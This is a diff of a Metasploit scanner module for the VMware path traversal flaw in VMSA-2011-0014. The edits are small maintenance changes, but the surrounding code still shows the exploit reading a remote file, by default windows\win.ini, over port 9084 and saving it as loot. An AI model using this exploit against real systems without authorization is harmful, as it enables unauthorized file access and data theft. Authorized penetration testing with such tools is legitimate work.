@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -32,14 +29,14 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'http://www.vmware.com/security/advisories/VMSA-2011-0014.html'],
           ['URL', 'http://dsecrg.com/pages/vul/show.php?id=342']
         ],
-      'DisclosureDate' => "Nov 21 2011"))
+      'DisclosureDate' => '2011-11-21'))
 
     register_options(
       [
         Opt::RPORT(9084),
         OptString.new('URIPATH', [true, 'URI path to the downloads', '/vci/downloads/']),
         OptString.new('FILE', [true, 'Define the remote file to download', 'windows\\win.ini'])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -66,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_good("File retrieved from: #{ip}")
       p = store_loot("vmware.traversal.file", "application/octet-stream", rhost, res.to_s, fname)
-      print_status("File stored in: #{p}")
+      print_good("File stored in: #{p}")
     end
   end
 end
